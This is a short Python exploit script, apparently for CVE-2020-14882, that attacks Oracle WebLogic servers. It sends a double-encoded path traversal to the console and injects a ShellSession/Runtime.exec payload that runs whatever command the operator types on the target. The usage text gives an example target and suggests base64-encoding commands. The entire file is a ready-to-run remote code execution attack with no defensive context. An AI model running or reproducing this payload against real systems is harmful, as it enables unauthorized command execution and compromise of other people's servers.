#!/usr/bin/python3
import requests
import sys


banner = '''
   _______      ________    ___   ___ ___   ___        __ _  _   ___   ___ ___  
  / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | || | / _ \ / _ \__ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | || || (_) | (_) | ) |
 | |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |__   _> _ < > _ < / / 
 | |____   \  /  | |____    / /_| |_| / /_| |_| |      | |  | || (_) | (_) / /_ 
  \_____|   \/   |______|  |____|\___/____|\___/       |_|  |_| \___/ \___/____|
                                                                                                                                                           
'''
def exploit():
	host = sys.argv[1]
	port = sys.argv[2]
	cmd = input("input cmd>")
	path = "/console/images/%252E%252E%252Fconsole.portal"
	url = "{}:{}{}".format(host, port, path)


	payload = "?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('{}');\");".format(cmd)
	headers = {
		"User-Agent": "Mozilla", 
		"Host": host.split("//")[1],
		"Accept-Encoding": "gzip, deflate",
		"cmd": "tasklist", 
		"Content-Type": "application/x-www-form-urlencoded"
	}

	try:
		url = url+payload
		print("[+]Attack Url:",url)
		print("Sent...")
		response = requests.get(url,headers=headers,timeout=10,verify=False)
		# print(response.text)
	except Exception as e:
		print(e)
		exit()
	

def exploit2():
    '''The second method of use'''
    print("你猜")

if __name__ == '__main__':
	if len(sys.argv) !=3:
		print(banner)
		print("Usage: python3 exploit.py http://qq.com 7001\ntips: Your Commands are best encoded in base64")
	else:
		exploit()
		#exploit2()
		
